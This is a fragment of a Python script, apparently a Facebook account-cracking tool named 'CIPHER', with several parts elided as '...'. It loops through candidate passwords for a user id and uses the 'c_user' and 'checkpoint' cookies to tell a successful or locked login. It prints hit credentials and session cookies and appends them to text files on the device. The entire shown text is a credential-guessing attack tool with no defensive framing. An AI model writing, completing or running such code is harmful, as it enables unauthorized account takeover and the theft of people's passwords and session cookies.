...
def main():
    ...
    print(' [✓] OK Ids saved as CIPHER-OK.txt')
    print(' [✓] CP Id Save as CIPHER-CP.txt')
    print('-------------------')
def CIPHER(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[CIPHER]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"[CIPHER-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/CIPHER-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"[CIPHER-CP] {cid}|{ps}")
                open('/sdcard/CIPHER-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
